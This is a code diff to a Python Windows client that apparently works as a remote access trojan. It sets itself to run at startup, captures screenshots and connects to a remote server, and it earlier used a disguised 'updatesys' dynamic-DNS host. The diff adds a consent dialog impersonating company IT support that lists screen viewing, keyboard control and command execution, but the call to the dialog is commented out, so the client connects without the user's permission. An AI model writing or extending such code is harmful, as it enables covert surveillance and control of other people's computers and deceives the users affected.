@@ -9,10 +9,11 @@ import time
 import subprocess
 import sys
 import winreg
+import tkinter as tk
 from PIL import Image, ImageGrab
 import io
 
-SERVER_IP = "updatesys.duckdns.org"
+SERVER_IP = "192.168.1.22"
 SERVER_PORT = 7700
 
 CHUNK_SIZE = 512 * 1024
@@ -110,6 +111,36 @@ def get_info():
     }
 
 RECONNECT_DELAYS = [5, 10, 30, 60]
+
+
+def request_remote_access_permission():
+    """نافذة إذن مختصرة: ترجع True عند الموافقة و False عند الرفض أو الخطأ."""
+    try:
+        root = tk.Tk()
+        root.title("Remote Access Request")
+        root.geometry("520x360")
+        root.attributes("-topmost", True)
+        choice = {"ok": False}
+
+        tk.Label(root, text="Remote Access Request", font=("Segoe UI", 13, "bold")).pack(pady=(12, 6))
+        msg = ("Your company’s IT support team is requesting permission to view "
+               "and control this device for maintenance and support purposes.")
+        tk.Message(root, text=msg, width=380, font=("Segoe UI", 10)).pack(pady=4)
+
+        tk.Label(root, text="If you click Accept, the technician will be able to:").pack(anchor="w", padx=14, pady=(6, 0))
+        for line in ["View your screen in real time", "Control your mouse and keyboard", "Run Command Prompt and manage files"]:
+            tk.Label(root, text="• " + line, anchor="w").pack(fill="x", padx=18)
+        tk.Label(root, text="You can terminate the session at any time.").pack(anchor="w", padx=14, pady=(4, 10))
+        tk.Label(root, text="Do you want to allow access?", font=("Segoe UI", 10, "bold")).pack()
+
+        btns = tk.Frame(root); btns.pack(pady=10)
+        tk.Button(btns, text="✅ Accept", width=10, command=lambda: (choice.update(ok=True), root.destroy())).pack(side="left", padx=6)
+        tk.Button(btns, text="❌ Decline", width=10, command=lambda: root.destroy()).pack(side="left", padx=6)
+
+        root.mainloop()
+        return choice["ok"]
+    except Exception:
+        return False
 
 def connect():
     ensure_startup()
@@ -451,5 +482,7 @@ def connect():
 
 if __name__ == "__main__":
     if already_running():
+        sys.exit(0)
+    #if not request_remote_access_permission():
         sys.exit(0)
     connect()
